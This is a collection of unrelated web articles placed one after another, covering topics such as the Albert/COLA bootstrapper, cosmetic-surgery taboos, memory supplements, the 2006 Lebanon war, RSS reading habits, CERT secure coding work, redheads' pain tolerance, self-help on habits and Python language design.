Albert is a bootstrapper that is able in a few hundreds of lines of code to make a kernel for Squeak that runs nine times faster than existing interpreters .
The bootstrap process looks fascinating :
A disposable compiler ( written in C++ ) implements a simple message - passing object - oriented language in which a specification - based Object compiler ( implementing the same language ) is implemented .
The system is now self - implementing but still static .
A dynamic expression compiler / evaluator is then implemented using the static compiler and used to replace the static messaging mechanisms with dynamic equivalents .
The system is now self - describing and dynamic ­ hence pervasively late - bound : its entire implementation is visible to , and dynamically modifiable by , the end user .
Again , the proposal gives a bit more detail , but i’m not sure i’m understanding it fully : if anyone knows if / where Albert ’s code is available , please chime in !
Not that i agree 100 % with all the ideas in the report ( and , as i said , there ’re quite a few i do n’t fully grasp ) , and i’m sure most of you wo n’t agree with everything either .
But it ’s definitely worth the effort reading , trying to understand and mulling over Alan Kay ’s vision of the future of programming .
He knows a bit about these things .
Update :
Thanks to Glenn Ehrlich , who in a comment below provides links to learn more about Ian Piumarta ’s Albert , also known as Cola / Coke / Pepsi .
are
anything
actually
Why did I write about this ?
There 's an idea that 's gradually taking root in the United States .
It 'll take about another generation ; that 's how long this kind of idea takes to permeate .
It 's already much further along in many other countries , including Brazil , China and Korea , and others .
The idea is simple enough : your body is no longer a prison for your soul .
It 's become more like a house , one that you can decorate to your tastes .
In the fullness of time it may even become more like clothes for your soul , and you 'll change it daily .
It 's interesting that this idea is having so much trouble in the US .
That 's not to say , of course , that the US is particularly progressive .
We 're behind most of the civilized world in cell phone infrastructure , and we never did manage to adopt the metric system ( unless you define " adopt " as " shoot km/h signs down with high - powered rifles " , in which case : adoption successful . )
And we love sports in which an actual ball is in play for under 10 minutes in a 3 - hour game .
But Americans are as vain as anyone else , so it 's strange that we have n't warmed to the idea of customizable bodies .
If you think idly about what the distant future will be like , assuming you do n't take the apocalyptic view , then you might envision everyone in the future as being healthy , beautiful , and long - lived .
That 's the way it is in all the sci - fi movies : take your pick , from Logan 's Run to Gattaca .
It 's not much of a mental leap , though , since from what we know of the Middle Ages , people were comparatively unhealthy , ugly , and short - lived .
( By " ugly " , I mean that people were more commonly disfigured from diseases or other misfortunes . )
If you extrapolate a few hundred years into the future , it 's easy to predict improved health and improved looks .
So we 're in a strange limbo today , because making changes to your body is n't quite yet socially acceptable , but people assume that it will be acceptable in the future .
You probably think I 'm overlooking the plastic surgery craze .
Well then : if a 22 - year old girl gets a nose job , and she has to wear a bandage for a couple weeks , does she tell everyone she got a nose job ?
Nope .
She fell down some stairs , or maybe had a split septum .
If people speculate that she got her nose redone , then she has to deny it , or say it was an accidental by - product of the surgery .
So yeah , there 's a plastic surgery craze , sort of .
But most people in the US ( even in Southern California ) are n't comfortable admitting it or talking about it .
Instead they have to lie about it .
Let 's take stock : what cosmetic changesacceptable these days ?
Tatoos and piercings have gradually become acceptable to everyone except the parents of the person in question .
Plus it 's hard to lie about them and say you accidentally shoved a steel bolt through your lip and then sat naked on an inverted permanent - ink design .
Anyone who 's not going gray is allowed to color their hair pretty much any color they want without exciting much comment .
A woman can color her hair to cover up gray .
It 's less acceptable for a man to do this , but he can more or less still get away with it .
Wigs and toupes , however , can't be talked about openly : they 're taboo .
Getting a wart or a mole removed : fine .
In fact people will be mildly surprised if you do n't go to the trouble to remove them .
Getting a scar removed or hidden : also definitely OK .
In fact , any and all kinds of reconstructive surgery to help recover from injuries or disease are perfectly acceptable , and you can talk about them without shame .
Little blue pills , oddly enough , have to be taken in secret .
Getting your legs extended by a doctor who saws through your bones and adds metal extenders : that 's one you do n't advertise .
The procedure is incredibly ( and increasingly ) popular in China , by all accounts .
Heck , in the US you can't even tell people that you wear platform shoes .
Getting your teeth bleached : fine to talk about , though most people wo n't advertise it .
Getting your anus bleached ( a popular new procedure discussed to death by such luminaries as Howard Stern and Adam Corolla ) : not so much .
You do n't send before / after pictures around to your friends , to the best of my knowledge .
How about a boob job ?
Unlike nose jobs , breast implants are now more or less acceptable to talk about and , yes , even brag about .
Everyone 's getting them , and nobody seems to think it 's a big deal any more .
What about butt implants , which are super popular in Brazil ?
I do n't know anyone in the US who brags about their butt implants , so I 'm guessing no , that one 's still taboo here .
Cosmetic vaginal surgery is all the rage these days , in case nobody 's told you yet .
You 're practically the last person to find out .
The two most popular variants are restoring the hymen , and removing the labia .
You can bet your implanted butt that neither of those procedures gets a lot of coffee - table discussion with the relatives and co-workers .
I think we can safely add them to the taboo list .
Same goes for penile , with the possible exception of reduction on account of elephantiasis .
Eyelids : it 's very popular in Asia to get your eyes " cut " , referring to a procedure that introduces a fold in your upper eyelid , which allegedly looks nicer , albeit at the cost of no longer being able to close your eyes fully when you 're asleep .
My understanding is that you 're not supposed to admit to having had this surgery .
However , changing your eye color via contacts is popular and non-taboo , so presumably if there were a surgical procedure to change the color permanently , it would also not be taboo .
Lids , taboo .
Color , not taboo .
Lash extensions , taboo .
Lasik , not taboo .
Got it .
Liposuction : should n't admit to it .
Artificial tanning : fine .
Hair implants : do n't admit to it .
Veneers for your teeth : OK , for the most part .
Lip implants : keep 'em secret .
And so on .
There 's a vast economy around cosmetics and cosmetic surgery , but only a handful of changes are socially acceptable in the US .
By " acceptable " , I mean they 're things you 'd talk about openly at work , like going to the dentist to get your teeth cleaned .
For most procedures , even the most popular ones , you have to pretend you did n't do it .
In case you had n't figured it out , I think the whole taboo - ness of cosmetic changes is pretty lame .
I think the girl should n't have to say she fell down the stairs .
People should be able to complement her on her pretty new nose the way you complement someone on a new haircut .
Same goes for all the other procedures I 've mentioned , although I confess even I might have trouble complimenting someone on their newly - bleached anus .
Generally speaking , though , I think it 's pretty obvious to most rational people that the trend is towards having control over how you look , and there 's nothing wrong with making yourself look better .
If a change makes you happier , then it will almost certainly make the people around you happier too .
And for that matter , changes can make you healthier -- you can already get your eyesight upgraded and your teeth upgraded , so in some sense our bodies are becoming like so much hardware .
What if you could get a new set of synthetic lungs , or a new heart , to put you in better shape and increase your life expectancy ?
It 's an open question , since organ replacements are n't readily accessible , and they have to come from other people .
But if you could grow them in vats , then would it be socially acceptable to purchase them for yourself ?
I sure hope so .
But futuristic upgrades aside , the fact remains : most permanent cosmetic modifications still too embarrassing to talk about openly .
Why is that ?
And why is the US in particular so far behind many other countries in how open we are about discussing them ?
I do n't know .
Maybe there is n't a simple answer .
But my suspicion is that it's a byproduct of our puritanical heritage in the US .
Cosmetic surgery is closely tied to vanity and pride , which are proscribed by any number of popular religions , presumably on the dubious grounds that if God made you ugly , then it was just " meant to be " and you have to live with it .
I 'm not sure how many peoplethink that way today in the US , in those exact terms -- probably no more than one percent of the population : a few million .
But it was likely the majority opinion 100 to 200 years ago , and it takes a long time for a culture to shake off the often ridiculous ideas passed down from our forebears .
However , I also think that cosmetic surgery has the evolutionary advantage : beautiful people get better treatment in the world , whether the world is conscious of it or not .
So being beautiful gets you , on average , better jobs , better pay , and a better lifestyle .
It pays to be good looking .
It seems like this is going to drive cosmetic surgery towards becoming more or less completely acceptable , up to and including changing your apparent race , roughly as fast as these things become technically feasible .
Economics will drive it .
In the meantime , feel free to treat yourself .
You deserve it .
Do n't let stupid , old - fashioned social mores ( the same ones that keep the mall from being open late on Sunday , the one day when you actually have time to go shop ) hold you back .
And if you ask me , you should n't have to lie if someone asks you about your hair or your nose or your love handles or whatever you changed .
Your body is your very own , and it 's just clothes for your soul , nothing more .
Decorate it however you please , and be proud of your decor .
Believe it or not , today 's rant was inspired by technical problems , which is why it 's here in this mostly - technical blog .
The technical problems ( and I wo n't bore you with details ) are the direct result of cultural problems related to the dissemination of ideas .
When you put two people together , they 're smarter than one person .
Ideas bounce around and settle in faster .
A group of two acting in concert can learn faster and respond faster than a single person can : the whole is greater than the sum of the parts .
But a group of three or four is back to being about as smart as a single person .
A group of ten to twenty people acts about as smart as a lost child , and a group of fifty is only about as smart as a dog .
It takes a while to teach a group of fifty people any new tricks .
A group of a hundred people ?
A sheep , of course .
A thousand or more ?
Lemmings .
When we 're in big groups , we just follow what everyone around us is doing .
The bigger the group , the dumber we get .
Unfortunately , this means that getting radical new ideas across can be tricky .
Imagine sitting in front of a sheep , trying to explain to it that new ideas have a hard time penetrating big groups of people , especially if they fly in the face of so - called conventional wisdom .
I can tell you this much : the sheep will be unimpressed .
One of the many techno- cultural problems I 've encountered is going to be the subject of my next blog .
A lot of people are going to react very negatively to the ideas I present in this upcoming blog , and oddly enough , their reactions are n't really coming from them as individuals .
The strongly negative reactions stem from membership in a group that thinks very differently about this technical subject than I do .
But when you 're in a group , even a virtual group comprised of people who subscribe to some technical belief , you 're only as smart as a sheep .
Happens to all of us .
I have various technical ideas in the oven that are n't ready to serve yet .
They 're in all stages of preparation , from still - mooing to raw to nearly ready to eat .
In each case I 'm looking for a way to break it to you easy , to explain it in just the right way .
That can be hard , because ideas embody change , and someone is always profiting from the status quo .
The profiting is n't always money -- sometimes people simply have their self - image tied up in the status quo .
If your idea threatens to change it , they feel you 're threatening them directly .
Sometimes the time is just ripe for an idea , and everyone seems to have it at the same time .
Other times , it 's pretty clear where we 're headed , but even so , people are n't willing to let go of some of their cherished old ideas that conflict with the new ones .
That 's where we 're at ( in the US , anyway ) with plastic surgery .
And sometimes an idea is so different and revolutionary that people either do n't get it at all , or they 're naturally inclined to misunderstand and criticize it .
When that happens , you have to attack it from different angles , and try to use tricks like metaphor or analogy to help people make the connections you want them to make .
I think the plastic - surgery problem is well - positioned as a educational tool : it seems pretty obvious ( to me , anyway ) that a twenty - something girl with a bright future who 's unhappy with her nose should be able to get the surgery without having to lie to everyone about falling down the stairs .
You 'd think everyone would be full of complements about her wonderful new nose , but instead we treat it like the Emperor 's clothes .
It 's sad .
And the situation wo n't change , not quickly enough at any rate , unless some sort of social miracle happens , in which trend - setters with charisma to spare start bragging about their new noses and lips and buttocks ... who knows !
Stranger things have happened .
Hopefully I 've planted a seed with this non-technical article , one that will take root , grow , and flourish into a beautiful tree , which I can then yank a branch from and whack people over the heads with when they choose to resist ideas simply because they fear change .
If that does n't work , and people still want to lynch me , well , I can always disguise myself with a fake moustache .
Well , the idea that you can just pop a pill to improve your mem­o­ry and atten­tion lost some ground today .
The Asso­ci­at­ed Press released an arti­cle on DHEA , a steroid pre­cur­sor to testos­terone and estro­gen used to improve ath­let­ic per­for­mance , increase sex dri­ve , and reduce fat as well as fight dia­betes and heart dis­ease .
The con­clu­sion of a two - year study at the Mayo Clin­ic in Min­neso­ta and Uni­ver­si­ty of Pad­ua in Italy was that it did not improve strength , phys­i­cal per­for­mance , or oth­er mea­sures of health .
The pos­i­tive news was :
No harm­ful side effects were detect­ed .
That is good news , but it does not mean the sup­ple­ments are alto­geth­er safe , said Simon Yeung , man­ag­er of the Web site on sup­ple­ments and inte­gra­tive med­i­cine at the Memo­r­i­al Sloan - Ket­ter­ing Can­cer Cen­ter in New York .
Glad to hear it ’s not harm­ful , but not an over­whelm­ing endorse­ment either !
Fur­ther­more , some pri­or research sug­gests “ DHEA car­ries risks and may cause side effects . ”
I would­ n’t run to the store just yet to get DHEA sup­ple­ments .
Gink­go bilo­ba is anoth­er over - the - counter mem­o­ry - enhanc­ing sup­ple­ment we have heard a lot about recent­ly .
Paul Solomon from Williams Col­lege found “ these data sug­gest that when tak­en fol­low­ing the man­u­fac­tur­er ’s instruc­tions , gink­go pro­vides no mea­sur­able ben­e­fit in mem­o­ry or relat­ed cog­ni­tive func­tion to adults with healthy cog­ni­tive func­tion . ”
Nicholas Burns from the Uni­ver­si­ty of Ade­laide , Aus­tralia just pub­lished his results from a dou­ble - blind , place­bo - con­trolled study assess­ing the effects of gink­go on a wide range of mea­sures of cog­ni­tive abil­i­ties , exec­u­tive func­tion , atten­tion and mood in healthy 55 – 79 year olds as well as 18 – 43 year olds .
He found longer - term mem­o­ry improved in the old­er pop­u­la­tion , but no improve­ment on any oth­er mea­sure for either the younger or old­er par­tic­i­pants .
On a pos­i­tive note , the report­ed side effects were mild .
Sarah Elsabagh from King ’s Col­lege Lon­don found gink­go improved atten­tion and mem­o­ry in the short term .
How­ev­er , there were no ben­e­fits after 6 weeks , sug­gest­ing that a tol­er­ance devel­ops quick­ly .
Again , not an over­whelm­ing endorse­ment .
And what about the omega‑3 fat­ty acids found in cold - water fish such as mack­er­el , her­ring , salmon , and tuna ?
They fare bet­ter with Giu­liano Fontani ’s work at the Uni­ver­si­ty of Siena in Italy .
He asso­ci­at­ed omega‑3 sup­ple­men­ta­tion with an improve­ment of atten­tion­al and phys­i­o­log­i­cal func­tions , par­tic­u­lar­ly those involv­ing com­plex cor­ti­cal pro­cess­ing .
He con­cludes his study by say­ing :
This was shown by the improve­ment of reac­tiv­i­ty , atten­tion and cog­ni­tive per­for­mances in addi­tion to the improve­ment of mood state and the mod­i­fi­ca­tions of some neu­ro - elec­tri­cal para­me­ters .
These results have been obtained from a small study group and need fur­ther con­fir­ma­tion in a wider group of sub­jects and in par­tic­u­lar for the pos­si­ble influ­ences of age and gen­der .
While the news looks promis­ing for omega‑3 fat­ty acids , there are still many out­stand­ing ques­tions and more research needs to be done .
What can you do right now ?
Eat a bal­anced diet , get plen­ty of phys­i­cal exer­cise , stay cog­ni­tive­ly active , and reduce your stress .
And as always , talk with your doc­tor about any con­cerns .
Com­bine these things , and you should stay healthy and active well into your lat­er years .

It was meant to be over by now .
This time last week Israeli military planners were demanding another 72 hours to finish the job : that 's all they needed , they promised , to clear southern Lebanon of Hizbullah .
Yet the enemy has proved stubborn .
Despite two weeks of bombardment , Hizbullah 's formidable arsenal remains in place .
Yesterday they fired yet more rockets - 60 of them - deep into Israel , reaching the city of Haifa and killing a teenage girl in the Arab village of Maghar .
This persistence is causing the first rumblings of Israeli disquiet .
Why are the Katyushas " still coming , and killing ? " asks one Israeli columnist .
Are the Israel Defence Forces losing their edge , asks another , wondering if " instead of an army that is small but smart , we are catching glimpses of an army that is big , rich and dumb " .
The top brass deny they have been surprised by Hizbullah 's strength .
They expected nothing less , they say - not least because Iran has been supplying the movement with more than $ 100 m worth of arms .
Which would explain the serious hardware , including long - range missiles , at Hizbullah 's disposal .
So far none of this has eroded the astonishingly high level of Israeli public support for the war .
I spoke yesterday to a " refusenik " , an Israeli soldier whose principles compelled him to spend a month in jail rather than serve in the West Bank or Gaza .
Even he was clear : " We had no choice but to hit back . "
This is not about defending occupied territory , because Israel is not an genuine occupier in Lebanon .
This is , he says , about defending the country from a proxy army of a state , Iran , that is committed to Israel 's destruction .
Little has punctured Israelis ' sense of self - belief .
They see few of the TV pictures we see , showing Lebanese children , bloodstained and weeping ; they have victims of their own to concentrate on .
As for the rest of the world 's condemnation , it does n't cut much ice .
Why should Israelis listen to Vladimir Putin when he tells them their response has been " disproportionate " ?
Was Russia 's pounding of Grozny proportionate ?
As for complaints from Britain and Europe about the 390 civilians killed in Lebanon , those are a reminder of the more than 3,000 civilians killed in the 2001 onslaught against Afghanistan : how was that proportionate exactly ?
Kim Howells was right to be appalled by what he saw in Beirut .
But he surely would have been just as shocked had he visited the Iraqi city of Falluja after the Americans had turned it to rubble .
Besides , not much of this criticism , including that from Howells , has got through at all .
The message projected by most of the Israeli media is that the bit of the world that matters - the US - is behind them .
The government certainly echoes that line , and it will have been emboldened by Condoleezza Rice 's show of understanding yesterday .
Indeed , for prime minister Ehud Olmert the backing of the US is central to everything this war is about .
The Tel Aviv University analyst Dr Gary Sussman calls it a " war for the legitimacy of unilateralism " .
This approach , first pursued by Ariel Sharon and now Olmert 's defining project , tells Israelis that it is OK to pull out from occupied territory - whether southern Lebanon in 2000 or Gaza in 2005 - because after withdrawal there will be a clear , recognised border , behind which Israel can defend itself more vigorously than ever .
That is why , once Hizbullah had captured those two Israeli soldiers , Olmert had to hit back .
If he had not , he would have vindicated the critics who brand unilateral withdrawal a glorified retreat , jeopardising Israel 's security .
He had to prove that pulling out did not mean running away , that Israel could still defend itself .
What 's more , because it had moved back to the internationally recognised border , Israel would now enjoy international legitimacy .
Washington has obligingly played its role , supplying the support that confirms Olmert 's logic .
This message is not aimed solely at the Israeli people .
It is also meant to restore the country 's " deterrence " , telling Hizbullah and the rest of the region that they cannot cross Israel 's borders , or seize its personnel , with impunity ( no matter how Israel itself behaves ) .
Israel is especially keen to disprove the " cobweb theory " , put about by Hizbullah : pull at one Israeli thread , such as its 18 - year presence in Lebanon until 2000 , and the rest will unravel .
The current operation is designed to say that Israel does not do unravelling .
There is a last audience for this war .
Olmert wants the Palestinians to see that if Israel withdraws from further territory , as he intends , it will not be a soft touch .
On the contrary , as the world has seen , if Israel is so much as scratched it will hit back very hard .
The prime minister wants this point seared into the minds of Hamas and Fatah so that they remember it come the day Israel withdraws from parts of the West Bank .
From his own point of view , Olmert had little alternative .
If he had accepted the soldiers ' kidnapping , and sought their return through diplomacy , most Israeli analysts are agreed that he would have been finished .
He would have confirmed his own weakness , a civilian with no military record , and he would have proved the anti-unilateralists right .
His own plan , to withdraw from more occupied territory , would be in shreds .
As things stand , he should now have the credibility to move forward .
That 's as close as we get to a crumb of comfort to be found in the rubble of this last fortnight .
Yet it need not have been this way .
Had one of the key players in the drama behaved differently , this entire mess could have been avoided .
I 'm thinking of the United States .
It 's fashionable to blame the US for all the world 's ills , but in this case the sins , both of omission and commission , of the Bush administration genuinely belong at the heart of the trouble .
Diplomacy has had a difficult task from the start , in part because the US is not seen as an honest broker , but as too closely aligned with Israel .
Washington has long been pro-Israel , but under President Clinton and the first President Bush there was an effort to be seen as a plausible mediator .
Not under George W. Far from keeping lines of communication open with Hizbullah 's two key patrons - Syria and Iran - they have been cast into outer darkness , branded as spokes , or satellites , of the axis of evil .
As a result there has been no mechanism to restrain Hizbullah .
Now , when the US needs Syria 's help , it may be too late .
Damascus will extract a high price , no doubt demanding the right to re-enter , in some form , Lebanon .
The White House can't grant that - not when it considers Syria 's ejection from Lebanon in 2005 one of its few foreign - policy successes .
But the record of failure goes deeper than that .
It began in the president 's first week , when Bush decided he would not repeat what he perceived as his predecessor 's mistake by allowing his presidency to be mired in the fruitless search for Israeli - Palestinian peace .
Even though Clinton had got tantalisingly close , Bush decided to drop it .
While Henry Kissinger once racked up 24,230 miles in just 34 days of shuttle diplomacy , Bush 's envoys have been sparing in their visits to the region .
The result is that the core conflict has been allowed to fester .
Had it been solved , or even if there had been a serious effort to solve it , the current crisis would have been unimaginable .
Instead , Bush 's animating idea has been that the peoples of the Middle East can be bombed into democracy and terrorised into moderation .
It has proved one of the great lethal mistakes of his abominable presidency - and the peoples of Israel and Lebanon are paying the price .

It 's easy to get sucked into things .
You can sit down with a good book for a few minutes and before you know it , several hours and a few hundred pages have gone by .
It happens to all of us now and then .
My allocation of time spent reading RSS feeds and various blog or social web sites ( Digg , Reddit , TailRank , Memeorandum , del.icio.us ) has always been a bit slippery .
I 'd simply read until I was done reading .
I had to make sure all those folders and feeds were un - bolded before I was " done . "
And every once in a while , the periodic update would run before I finished , and I 'd end up with even more work to do .
The horror !
I spent some time thinking hard about that use of my time yesterday and realized that it's a classic example of diminishing returns .
Since I almost always read that stuff in my own " priority order " I get the most bang for my time in the first 15 minutes or so .
Beyond that , I 'm panning for gold and it feels like the supply is dwindling .
Another 10 minutes spent reading about the latest Dave Winer drama is hardly a good use of my time .
I remember reading about Robert Scoble 's reading habits a while ago .
He 'd spend 3 - 5 hours every day reading his 1,500 + feeds , also panning for gold .
That seemed insane to me then ( and still does ) .
But I 've been doing the same thing , albeit in a less extreme way .
So it 's time to change my habits -- or at least form new ones .
For the next two weeks I 'm allocating 30 minutes per day to this reading , trolling , and mining effort .
There 's no pre-set limit on how much time I 'll spend writing .
The returns associated with writing appear to be quite different .
What will I do with that extra time ?
I 'll spend the " work " time coding a new idea and battling the inbox .
I 'll spend the " home " time studying for my upcoming FAA written test .
Someday someone will pull all this ranking , customization , personalization , recommendation , and other magic technology together and give me a great reason to throw out my RSS Aggregator once at for all .
Until then , I 'm going on a Feed Diet .

Research , Coding Standards , and Best Practices
To enable software developers to reduce vulnerabilities by eliminating coding errors , CERT researchers investigate how errors occur and how to prevent them , codify best practices and coding standards for security , and contribute that knowledge to the programming community .
We disseminate information on these practices through courses , standards , webinars , blogs , conferences , reports , newsletters , and our Secure Coding wiki .
Community Guidance to Prevent Common Coding Errors
As a result of our work in developing secure coding practices and participation in creating international standards , we have released standards for C , C++ , and Java .
Standards for Perl and Android are in development and available on our wiki .
The team has also begun efforts to create secure coding standards for additional languages : Ada , C# , Fortran , Python , JavaScript , and SPARK .
Our secure coding standards consist of actionable guidelines ( rules and recommendations ) , which provide information about the types of security flaws that can be injected through development with specific programming languages .
Each guideline offers a wealth of precise information describing the cause and impact of violations , including examples of common noncompliant ( flawed ) and compliant ( fixed ) code .
Each guideline also includes a risk assessment for violations to it .
You can access and download the standards for secure coding on the Secure Coding wiki .
Our secure coding standards are developed by studying the standards that define the programming languages themselves and how they are interpreted and compiled for runtime platforms .
They also reflect our experience with audits of millions of lines of source code and countless contributions from the community .
We have also contributed to international committees to improve the security of the programming languages and tools that are used to build systems with those languages .
In addition to developing standards and guidelines , we offer training to help developers , auditors , and testers improve their secure coding skills based on standards and identified best practices .
The training is available with a live instructor or as an online course .
We also made evaluating software for violations of specific secure coding rules more practical and accessible by developing static analysis checkers for rules in Clang ( and Clang - Tidy ) and our Rosecheckers tool .
We ’ve also advanced and developed other useful secure coding tools .
Source Code Analysis Laboratory
Our research , as well as research from others , has shown that different static analysis tools ( tools designed to analyze source code to help find security flaws ) are optimized to find different types of weaknesses .
Therefore , it is almost always best to evaluate source code with multiple static analysis tools .
However , doing so creates the complication of evaluating the results from multiple tools in an integrated way .
Additionally , static analysis tools often have high false - positive rates ( the alerts do not identify an actual problem ) and often indicate stylistic issues rather than security issues .
Our experience performing audits with multiple static analysis tools improved our effectiveness and efficiency .
From that experience , we developed the Source Code Analysis Laboratory ( SCALe ) , which audits code to identify security flaws as indicated by violations of the CERT secure coding standards .
The SCALe tools aggregate output from commercial , open source , and experimental analysis tools and provide results in a single interface .
They also filter out alerts that are not security related and map the security alerts from those tools to specific guidelines of the secure coding standards .
This alert processing enables developers to quickly learn more about the security issue the alert is diagnosing , how to fix it , and how best to prioritize it with other alerts .
We can perform a SCALe assessment as a service to third parties , and we can help organizations adopt aspects of SCALe to help them improve their secure coding development and evaluation processes .
Redheads have long been portrayed in literature and art as strong - willed and fiery .
Now there may be a scientific explanation for these traits .
The key , according to researchers at McGill University in Montreal , is a gene that is linked both to red hair coloring and to higher levels of pain tolerance .
It has been known since the mid-1990's that mutations of the MC1R gene are responsible for hair color -- and fair skin and freckles -- in about 70 percent of redheads .
But when Jeffrey S. Mogil and his colleagues at McGill set out to find a genetic link to pain inhibition , MC1R was n't at the top of their list of targets .
" We normally only get excited about genes in the brain when it comes to pain , " he says .
" This is in the skin . "
There was , however , a little - noticed paper that said MC1R was in fact expressed in the brain .
It was enough of a clue to go on .
So , earlier this year , Mogil ran some mice through a battery of pain tests , using mice with the red - hair gene as his test group .
( A collaborator in the Netherlands ran the same study with humans , giving them electrical shocks to the leg . )
When animals and humans experience pain , their brains release natural opiates similar to morphine .
In most cases , however , the MC1R gene produces a protein that interferes with the efficacy of those substances as well as of artificial painkillers .
What Mogil found is that the variant of MC1R that causes red hair also appears to allow these opiates to work unimpeded .
As a result , redheads can withstand up to 25 percent more pain than their blond and brunet peers do before saying " stop . "
The research may give redheads something to brag about , but it could also lead to the development of better painkilling drugs and anesthesia .
Redheads already require smaller amounts of analgesics to deal with pain ; if scientists can reproduce the aspect of the mutated MC1R gene that makes this possible , it could help even those of us who were n't blessed with ginger locks .

Over time , we all gather a set of constricting habits around us — ones that trap us in a zone of supposed comfort , well below what our potential would allow us to attain .
Pretty soon , such habits slip below the level of our consciousness , but they still determine what we think that we can and cannot do — and what we cannot even bring ourselves to try .
As long as you let these habits rule you , you ’ll be stuck in a rut .
Like the tiny , soft bodied creatures that build coral reefs , habits start off small and flexible , and end up by building massive barriers of rock all around your mind .
Inside the reefs , the water feels quiet and friendly .
Outside , you think it ’s going to be rough and stormy .
There may be sharks .
But if you ’re to develop in any direction from where you are today , you must go outside that reef of habits that marks the boundaries of your comfort zone .
There ’s no other way .
There ’s even nothing specially wrong with those habits as such .
They probably worked for you in the past .
But now , it ’s time to step over them and go into the wider world of your unused potential .
Your fears do n’t know what ’s going to be out there , so they invent monsters and scary beasts to keep you inside .
Staying in the Comfort Zone to Avoid Mistakes ?
Nobody ’s born with an instruction manual for life .
Despite all the helpful advice from parents , teachers and elders , each of us must make our own way in the world , doing the best we can and quite often getting things wrong .
Messing up a few times is n’t that of a big deal .
But if you get scared and try to avoid all mistakes by sticking with just a few “ tried and true ” behaviors , you ’ll miss out on most opportunities as well .
Lots of people who suffer from boredom at work are doing it to themselves .
They ’re bored and frustrated because that ’s what their choices have caused them to be .
They ’re stuck in ruts they ’ve dug for themselves while trying to avoid making mistakes and taking risks .
People who never make mistakes never make anything else either .

How to Break Out of Your Comfort Zone
It ’s time to pin down the habits that have become unconscious and are running your life for you , and get rid of them .
Here ’s how to do it :
1. Understand the Truth about Your Habits
They always represent past successes .
You have formed habitual , automatic behaviors because you once dealt with something successfully , tried the same response next time , and found it worked again .
That ’s how habits grow and why they feel so useful .
To get away from what ’s causing your unhappiness and workplace blues , you must give up on many of your most fondly held ( and formerly successful ) habits and try new ways of thinking and acting .
There truly is n’t any alternative .
Those habits are going to block you from finding new and creative ideas .
No new ideas , no learning .
No learning , no access to successful change .
This article can help you understand better how habits work : What Is a Habit ?
Understand
It to Control It 100 %
2. Do Something — Almost Anything — Differently and See What Happens
Even the most successful habits eventually lose their usefulness as events change the world and fresh responses are called for .
Yet we cling on to them long after their benefit has gone .
Past strategies are bound to fail sometime .
Letting them become automatic habits that take the controls is a sure road to self - inflicted harm .
Advertising
3. Take Some Time out and Have a Detailed Look at Yourself — With No Holds Barred
Discovering your unconscious habits can be tough .
For a start , they ’re unconscious , right ?
Then they fight back .
Ask anyone who has ever given up smoking if habits are tough to break .
You ’ve got used to them — and they ’re at least as addictive as nicotine or crack cocaine .
4. Be Who You Are
It ’s easy to assume that you always have to fit in to get on in the world ; that you must conform to be liked and respected by others or face exclusion .
Because most people want to please , they try to become what they believe others expect , even if it means forcing themselves to be the kind of person they are n’t , deep down .
You need to start by putting yourself first .
You ’re unique .
We ’re all unique , so saying this does n’t suggest that you ’re better than others or deserve more than they do .
You need to put yourself first because no one else has as much interest in your life as you do ; and because if you do n’t , no one else will .
Putting others second means giving them their due respect , not ignoring them totally .
Keeping up a self - image can be a burden .
Hanging on to an inflated , unrealistic one is a curse .
Give yourself a break .
Advertising
Here ’s How to Be True to Yourself and Live the Life You Want .
5. Slow Down and Let Go
Most of us want to think of ourselves as good , kind , intelligent and caring people .
Sometimes that ’s true .
Sometimes it is n’t .
Reality is complex .
We ca n’t function at all without constant input and support from other people .
Everything we have , everything we ’ve learned , came to us through someone else ’s hands .
At our best , we pass on this borrowed existence to others , enhanced by our contribution .
At our worst , we waste and squander it .
So recognize that you ’re a rich mixture of thoughts and feelings that come and go , some useful , some not .
There ’s no need to keep up a façade ; no need to pretend ; no need to fear of what you know to be true .
When you face your own truth , you ’ll find it ’s an enormous relief .
If you ’re maybe not as wonderful as you ’d like to be , you are n’t nearly as bad as you fear either .
Advertising
The truth really does set you free ; free to work on being better and to forgive yourself for being human ; free to express your gratitude to others and recognize what you owe them ; free to acknowledge your feelings without letting them dominate your life .
Above all , you ’ll be free to understand the truth of living : that much of what happens to you is no more than chance .
It ca n’t be avoided and is not your fault .
There ’s no point in beating yourself up about it .
Take a look at these 21 Things To Do When You Find It Hard To Let Go .
Final Thoughts
What is holding you in situations and actions that no longer work for you often is n’t inertia or procrastination .
It ’s the power of habitual ways of seeing the world and thinking about events .
Until you can let go of those old , worn - out habits , they ’ll continue to hold you prisoner .
To stay in your comfort zone through mere habit , or — worse still — to stay there because of irrational fears of what may lie outside , will condemn you to a life of frustration and regret .
If you can accept the truth about the world and yourself , change whatever is holding you back , and get on with a fresh view on life , you ’ll find that single action lets you open the door of your self - imposed prison and walk free .
There ’s a marvelous world out there .
You ’ll see , if you try it !
More Tips to Help You Start Changing

Well , that 's all for now .
Now you know everything I think is wrong with Python ( that I can think of right now ) , and most of what I think would make it right .
Looking over it again , I actually do n't think it's that pie - in - the - sky , though some parts ( like self ) are indeed tricky , and involve more than just syntactic additions .
The lexical scoping problems people have do n't bother me .
I would n't want Javascript - like variable declarations to define scope .
It would be nice if Python gave an error earlier for scoping mistakes , though , and a better error too .
I think this is statically detectable .
Maybe something in addition to just the global declaration would be useful .
People ask for lexical , and I can certainly see the benefit .
( Note : this is only an issue when assigning to variables in enclosing scopes )
I also kind of like no-public - attributes ( i.e. , all outside access is explicitly identified ) .
property ( ) helps a lot , but is n't all I would like .
I actually like ?
and !
in function names , as in Scheme .
But I do n't think it is worth adding .
self in method bodies would not become optional .
I.e. , you 'd still talk about self .
instance_variable .
That 's a brevity that I do n't want .
Ruby 's @ is fine ( but does n't fit Python 's aesthetic ) .
But the implicit this is horrible , and unworkable in Python anyway .
People often clump signature - self whining together with body - self whining .
One of those groups has a point , the other group does n't .
Anyway , I think the complaining would go away entirely if signatures and super was fixed , because people only complain about method bodies because think it adds weight to their argument against signatures ( even though I think the opposite is true ) .
I 'd be fine with := as an assignment - expression , because I would n't misspell it .
That would certainly be useful .
The minimalists would hate this .
Turning = into an expression .
To generalize : dynamic typing adds some usually shallow errors in return for far more expressive code .
Assignment as an expression adds some really obnoxious errors ( ones that do n't raise exceptions ) in return for minor expressiveness .
That = is n't an expression catches me from making hard bugs almost every day ( instead they are easy syntax error bugs ) .
I like the idea of adding to the ways you can express data in Python ( it 's not bad now ) .
But actual macros do n't really interest me ( in a general sense ) as I think they work on the wrong level -- they deal with syntax transformations , as opposed to object - level transformations .
